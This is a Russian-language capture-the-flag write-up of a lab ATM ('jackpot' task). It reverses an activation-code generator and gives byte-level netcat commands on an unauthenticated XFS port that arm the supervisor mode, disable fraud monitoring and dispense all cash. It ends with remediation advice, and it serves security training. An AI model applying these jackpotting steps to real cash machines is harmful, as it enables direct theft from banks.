# Отчёт о проникновении в банкомат «Jackpot»

## 1. Введение

В рамках задания проводилось тестирование на проникновение банковского терминала (ATM) «Earth's National Bank», выведенного из сети для криминалистического анализа после серии необъяснимых выдач наличных. По условию, интерфейс обслуживания был доступен из сети, хотя должен был работать только в локальной сети отделения. Терминал общается с устройством выдачи наличных по протоколу XFS (CEN/XFS) без должной аутентификации.

**Цель:** исследовать терминал, изучить, как его программное обеспечение взаимодействует с оборудованием, и заставить устройство выдать все наличные из кассет, получив флаг.

В отчёте последовательно описаны все этапы работы, включая удачные и неудачные попытки, с пояснениями, почему был выбран тот или иной вектор.


## 2. Первичная разведка (Nmap)

Сканирование целевого хоста `10.129.161.17` выявило три открытых порта:

```
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux)
8080/tcp open  http       BaseHTTPServer 0.6 (Python 3.12.3)
|_http-title: Earth's National Bank — Terminal 004 Engineering Console
| http-methods: GET
9100/tcp open  jetdirect?
Service Info: OS: Linux
```

**Вывод:**

- **22** — SSH (OpenSSH).
- **8080** — веб-интерфейс «Engineering Console» (Python BaseHTTPServer).
- **9100** — нестандартный сервис (обычно JetDirect, но здесь — что-то другое).


## 3. Исследование порта 8080

### 3.1. Главная страница

На главной странице обнаружен JavaScript, который запрашивает статус терминала и кассет. Ответ сервера:

```json
{
  "nonce": "502336",
  "armed": false,
  "monitor_on": true,
  "locked": false,
  "lock_remaining": 0,
  "screen": "INSERT CARD",
  "dispensed_total": 0,
  "remaining_notes": 280,
  "vault_total_notes": 280,
  "cassettes": [
    {"id": "CST1", "denom": 10, "count": 100},
    {"id": "CST2", "denom": 20, "count": 80},
    {"id": "CST3", "denom": 50, "count": 60},
    {"id": "CST4", "denom": 100, "count": 40}
  ],
  "flag_released": false
}
```

**Ключевые поля:**

- **`nonce`** — `502336` (сессионный код).
- **`armed`** — `false` (супервизор выключен).
- **`monitor_on`** — `true` (мониторинг мошенничества включён).
- **`locked`** — `false`.
- **`dispensed_total`** — `0` (выдано купюр).
- **`remaining_notes`** — `280` (осталось купюр).
- **`cassettes`** — 4 кассеты: CST1 (10), CST2 (20), CST3 (50), CST4 (100).
- **`flag_released`** — `false` (флаг ещё не выдан).

### 3.2. JavaScript на странице

JS-код отображает состояние терминала:

```javascript
$("dotArmed").className = "dot" + (d.armed ? " on" : "");
$("txtArmed").textContent = d.armed ? "ON" : "OFF";
```

**Поле `armed`** отвечает за включение/выключение супервизора.

```javascript
const f = $("flag");
if (d.flag_released) {
  f.classList.add("show");
  f.textContent = "Vault empty — cashout proven. Flag released to operator.";
} else {
  f.classList.remove("show");
}
```

**Поле `flag_released`** — нужный флаг. Он отобразится при **соблюдении каких-то условий** (возможно, при **опустошении кассет**).

### 3.3. Скачивание service tool

На странице есть ссылка «Download service tool — jackpot».


## 4. Исследование скачанного файла `jackpot`

### 4.1. Тип файла

```bash
jackpot: ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
```

**Файл генерирует код по сессионному коду.**

### 4.2. Использование

```bash
./jackpot 123123
[*] session nonce : 123123
[*] activation code: 90342767
```

**Файл принимает 6-значный `nonce` и выдаёт 8-значный `activation code`.**

### 4.3. Дизассемблирование

**Основная функция `FUN_001010a0`:**

```c
if (param_1 == 2) {
    pcVar5 = (char *)param_2[1];
    sVar2 = strlen(pcVar5);
    if (sVar2 == 6) {                          // nonce должен быть 6 символов
        __printf_chk(2,"[*] session nonce : %s\n",pcVar5);
        pbVar4 = (byte *)param_2[1];
        uVar3 = 0xcbf29ce484222325;            // FNV-1a offset basis
        bVar1 = *pbVar4;
        while (bVar1 != 0) {                   // FNV-1a хеш от nonce
            pbVar4 = pbVar4 + 1;
            uVar3 = (uVar3 ^ bVar1) * 0x100000001b3;
            bVar1 = *pbVar4;
        }
        pcVar5 = "ENBANK";                     // соль
        uVar6 = 0x45;                          // 'E'
        do {
            pcVar5 = pcVar5 + 1;
            uVar3 = (uVar6 ^ uVar3) * 0x100000001b3;
            uVar3 = uVar3 >> 0x1d ^ uVar3;     // XOR-сдвиг
            uVar6 = (ulong)(byte)*pcVar5;
        } while (*pcVar5 != 0);
        __printf_chk(2,"[*] activation code: %08u\n",uVar3 % 100000000);
        return 0;
    }
}
```

**Алгоритм:**

1. **FNV-1a хеш** от 6-значного `nonce`.
2. **Дополнительное хеширование** с солью `"ENBANK"`.
3. **Результат по модулю 100000000** — 8-значный код.

**Вывод:** код активации **вычисляется** из `nonce` **детерминированно**. Для каждого `nonce` — **свой код**.


## 5. Поиск применения коду активации

### 5.1. Фаззинг директорий и API

**Любая страница возвращает 200**, даже несуществующая — приложение **не проверяет путь** в URL.

```
http://10.129.161.17:8080/test → 200 OK
```

**Вывод:** стандартный фаззинг **не работает** — всё отдаёт 200.


## 6. Исследование порта 9100

### 6.1. Баннер XFS

```bash
nc 10.129.161.17 9100
```

**Ответ:**

```json
{
  "service": "Branch Engineering Gateway",
  "protocol": "XFS bridge",
  "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data",
  "reply_format": "2 byte big-endian length + <length> bytes of JSON",
  "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"},
  "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"
}
```

**Разбор:**

- **XFS** — стандарт CEN/XFS для банкоматов.
- **Формат запроса:** `msg_type (1) + command_id (4 BE) + length (2 BE) + data`.
- **Формат ответа:** `length (2 BE) + JSON`.
- **`GETINFO`** = `0x01`, **`EXECUTE`** = `0x02`.
- **Подсказка:** запросить `0x0304` (`WFS_INF_CDM_CAPABILITIES`) через `GETINFO`.

### 6.2. Получение списка команд

```bash
printf '\x01\x00\x00\x03\x04\x00\x00' | nc 10.129.161.17 9100
```

**Ответ:**

```json
{
  "rc": "WFS_SUCCESS",
  "interface": "Branch Engineering Gateway (XFS bridge)",
  "device_class": "CDM",
  "commands": {
    "WFS_INF_CDM_STATUS": "0x301",
    "WFS_INF_CDM_CASH_UNIT_INFO": "0x303",
    "WFS_INF_CDM_CAPABILITIES": "0x304",
    "WFS_CMD_CDM_DISPENSE": "0x401",
    "WFS_CMD_CDM_ARM": "0x4f0",
    "WFS_CMD_CDM_SET_MONITOR": "0x4f1",
    "WFS_CMD_CDM_GET_FLAG": "0x4ff"
  },
  "max_dispense": 40
}
```

**Ключевые команды:**

- **`WFS_INF_CDM_STATUS` (0x301)** — статус.
- **`WFS_INF_CDM_CASH_UNIT_INFO` (0x303)** — информация о кассетах.
- **`WFS_INF_CDM_CAPABILITIES` (0x304)** — возможности.
- **`WFS_CMD_CDM_DISPENSE` (0x401)** — выдача наличных.
- **`WFS_CMD_CDM_ARM` (0x4f0)** — включение супервизора.
- **`WFS_CMD_CDM_SET_MONITOR` (0x4f1)** — управление мониторингом.
- **`WFS_CMD_CDM_GET_FLAG` (0x4ff)** — получение флага.

**`max_dispense = 40`** — максимум 40 купюр за одну выдачу.


## 7. Попытки использования команд

### 7.1. `GET_FLAG` (0x4ff)

```bash
printf '\x02\x00\x00\x04\xff\x00\x00' | nc 10.129.161.17 9100
```

**Ответ:**

```json
{"rc": "WFS_ERR_CDM_CASHUNITERROR", "detail": "no proof of cashout on record"}
```

**Вывод:** флаг **не выдаётся** без **доказательства выдачи** наличных (`no proof of cashout`).

### 7.2. `ARM` (0x4f0) — без кода

```bash
printf '\x02\x00\x00\x04\xf0\x00\x00' | nc 10.129.161.17 9100
```

**Ответ:**

```json
{"rc": "WFS_ERR_CDM_INVALIDCODE", "detail": "invalid activation code"}
```

**Вывод:** `ARM` **требует** **код активации**.

### 7.3. Получение кода активации

**Известен `nonce` = `502336`** (из JSON на порту 8080).

```bash
./jackpot 502336
[*] session nonce : 502336
[*] activation code: 14084762
```

**Код активации:** `14084762`.

### 7.4. `ARM` с кодом активации

```bash
printf '\x02\x00\x00\x04\xf0\x00\x08'14084762 | nc 10.129.161.17 9100
```

**Ответ:**

```json
{"rc": "WFS_SUCCESS", "detail": "armed - supervisor mode"}
```

**Успешное включение супервизор-мода.**


## 8. Попытки выдачи наличных

### 8.1. Первая выдача — успех

```bash
printf '\x02\x00\x00\x04\x01\x00\x00' | nc 10.129.161.17 9100
```

**Ответ:**

```json
{"rc": "WFS_SUCCESS", "notes": 40, "value": 4000, "remaining_notes": 240}
```

**Выдано:** 40 купюр, стоимость 4000, осталось 240 купюр.

### 8.2. Вторая выдача — ошибка

```bash
printf '\x02\x00\x00\x04\x01\x00\x00' | nc 10.129.161.17 9100
```

**Ответ:**

```json
{"rc": "WFS_ERR_CDM_LOCKED", "detail": "anomalous dispense with null transaction id -> machine locked", "lock_seconds": 45}
```

**Вывод:** вторая выдача **заблокирована** из-за **аномальной выдачи без `transaction id`**. Машина **заблокирована на 45 секунд**.

**После блокировки:** сессия **сбрасывается**, количество снятых купюр **обнуляется**.


## 9. Отключение мониторинга

### 9.1. `SET_MONITOR` (0x4f1) — без данных

```bash
printf '\x02\x00\x00\x04\xf1\x00\x00' | nc 10.129.161.17 9100
```

**Ответ:**

```json
{"rc": "WFS_SUCCESS", "monitor_on": true}
```

**Вывод:** команда **вернула** **текущее** **состояние** — мониторинг **включён**. **Не** **выключила**.

### 9.2. `SET_MONITOR` с `'0'` (ASCII)

```bash
printf '\x02\x00\x00\x04\xf1\x00\x01\x30' | nc 10.129.161.17 9100
```

**Ответ:**

```json
{"rc": "WFS_SUCCESS", "monitor_on": false}
```

**Успешное отключение мониторинга.**

**Разбор байтов:**

| Байты | Что |
|---|---|
| `\x02` | `msg_type` = EXECUTE |
| `\x00\x00\x04\xf1` | `command_id` = `0x4f1` |
| `\x00\x01` | `length` = 1 |
| `\x30` | `data` = ASCII `'0'` |

**`\x30`** — **ASCII-код** `'0'` = **48** = **выключить**.

## 10. Опустошение кассет и получение флага

### 10.1. Повторная выдача после отключения мониторинга

После **отключения мониторинга** (`monitor_on: false`) **повторно** отправлены запросы **выдачи**.

**Ответ:**

```json
{"rc": "WFS_SUCCESS", "notes": 40, "value": 400, "remaining_notes": 0, "detail": "vault empty - cashout proven; GET_FLAG now available"}
```

**Ключевое:**

- **`remaining_notes` = 0** — **кассеты пусты**.
- **`detail`:** «**vault empty - cashout proven; GET_FLAG now available**».

### 10.2. `GET_FLAG` после опустошения

```bash
printf '\x02\x00\x00\x04\xff\x00\x00' | nc 10.129.161.17 9100
```

**Ответ:** **флаг**.

**Условие:** `flag_released = true` — **только после** **опустошения** **кассет** (`vault empty`).


## 11. Цепочка атаки

1. **Nmap** → порты 22, 8080, 9100.
2. **Порт 8080** → JSON со статусом: `nonce = 502336`, `cassettes` (4 кассеты), `flag_released = false`.
3. **Скачивание `jackpot`** → ELF-файл для генерации кода активации.
4. **Порт 9100** → XFS-протокол, баннер с форматом запроса.
5. **`WFS_INF_CDM_CAPABILITIES` (`0x304`)** → список команд.
6. **`GET_FLAG` (`0x4ff`)** → `no proof of cashout`.
7. **`ARM` (`0x4f0`)** без кода → `INVALIDCODE`.
8. **`jackpot 502336`** → код активации `14084762`.
9. **`ARM` с кодом** → `armed - supervisor mode`.
10. **`DISPENSE` (`0x401`)** → **первая выдача успешна** (40 купюр, 4000).
11. **`DISPENSE` повторно** → **блокировка** (`anomalous dispense with null transaction id`).
12. **`SET_MONITOR` (`0x4f1`)** с `'0'` → **мониторинг отключён**.
13. **Повторная `DISPENSE`** → **кассеты опустошены**, `vault empty`.
14. **`GET_FLAG`** → **флаг**.


## 12. Разбор уязвимостей

| Уязвимость | Описание | Влияние |
|---|---|---|
| **Открытый XFS-порт (9100)** | Интерфейс обслуживания доступен из сети | Прямое управление ATM |
| **Отсутствие аутентификации** | Команды выполняются без проверки подлинности | Любой может управлять устройством |
| **Слабый код активации** | Генерируется детерминированно из `nonce` | Код вычисляется |
| **`nonce` в открытом виде** | `nonce` передаётся в JSON на порту 8080 | Код активации вычисляется |
| **`SET_MONITOR` без пароля** | Мониторинг отключается одной командой | Обход защиты от мошенничества |
| **`DISPENSE` без `transaction id`** | Первая выдача проходит, вторая блокируется | Можно опустошить кассеты |
| **Логика флага** | Флаг выдаётся после опустошения кассет | Цель — опустошить ATM |


## 13. Рекомендации по устранению

1. **Изолировать порт 9100** — XFS-интерфейс должен быть доступен только из доверенной сети.
2. **Ввести аутентификацию** для XFS-команд.
3. **Не передавать `nonce` в открытом виде** — использовать защищённый канал.
4. **Усилить код активации** — добавить секрет, известный только серверу.
5. **Защитить `SET_MONITOR`** — требовать аутентификацию.
6. **Требовать `transaction id`** для `DISPENSE`.
7. **Ограничить `max_dispense`** на стороне сервера.


## 14. Заключение

Задание пройдено полностью. Цепочка атаки: **XFS-протокол без аутентификации → генерация кода активации из `nonce` → `ARM` → `DISPENSE` → отключение мониторинга → опустошение кассет → `GET_FLAG` → флаг**. Ключевая ошибка — **открытый XFS-интерфейс без аутентификации** и **детерминированный код активации**, вычисляемый из `nonce`. Все шаги выполнены в логике «как реальный атакующий»: разведка → анализ протокола → эксплуатация → обход защиты → получение флага. Цель достигнута — **флаг получен**.